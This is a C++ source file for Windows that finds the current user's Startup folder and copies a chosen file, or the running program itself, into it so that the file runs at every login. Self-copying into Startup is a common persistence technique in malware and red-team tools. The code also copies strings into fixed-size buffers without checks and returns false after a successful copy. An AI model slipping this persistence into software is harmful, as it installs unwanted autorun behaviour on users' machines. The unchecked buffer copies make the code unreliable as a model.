#pragma warning(disable:4996)
#include "AutoRun.h"

//#define DEBUG

BOOL GetStartUpDirPath(char* StartUpDir)
{
    char NameBuffer[MAX_PATH] = { 0 };
    char PathBuffer[MAX_PATH] = "C:\\Users\\";
    DWORD dwBufferLength = MAX_PATH;
    BOOL bFlag = FALSE;

    //SHGetFolderPathA()
    bFlag = GetUserNameA(NameBuffer, &dwBufferLength);
    if (!bFlag)
    {
#ifdef DEBUG
        printf("GetUserNameA:%x\n", GetLastError());
#endif
        return false;
    }
    //puts(NameBuffer);

    strcat(PathBuffer, NameBuffer);
    strcat(PathBuffer, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    strcpy(StartUpDir, PathBuffer);

    return true;
}

BOOL AutoRun::StartUpFloderAutoRun(char* szTargetFilePath,const char* szAutoRunFileName)
{
    char szStartUpDirPath[MAX_PATH] = { 0 };
    char szSrcFilePath[MAX_PATH] = { 0 };
    char szDstFilePath[MAX_PATH] = { 0 };
    BOOL bFlag = false;

    bFlag = GetStartUpDirPath(szStartUpDirPath);
    if (!bFlag)
    {
#ifdef DEBUG
        printf("GetStartUpDirPath:%x\n", GetLastError());
#endif // DEBUG
        return false;
    }
    //puts(szStartUpDirPath);

    strcpy(szDstFilePath, szStartUpDirPath);
    strcat(szDstFilePath, "\\");
    strcat(szDstFilePath, szAutoRunFileName);
    //puts(szDstFilePath);

    if (szTargetFilePath == NULL)
    {
        GetModuleFileNameA(NULL, szSrcFilePath, MAX_PATH);
        //puts(szSrcFilePath);
    }
    else
    {
        strcpy(szSrcFilePath, szTargetFilePath);
    }

    bFlag = CopyFileA(szSrcFilePath, szDstFilePath, FALSE);    //将文件复制到文件夹下
    if (!bFlag)
    {
        DWORD LastError = GetLastError();
        if (LastError == 0x3)
        {
            CreateDirectoryA(szStartUpDirPath,NULL);
            CopyFileA(szSrcFilePath, szDstFilePath, TRUE);
            return true;
        }
        //else if (LastError == 0x50)
        //{
        //    return true;
        //}
#ifdef DEBUG
        printf("CopyFile Error %x\n", GetLastError());
#endif
        return false;
    }
    return false;
}
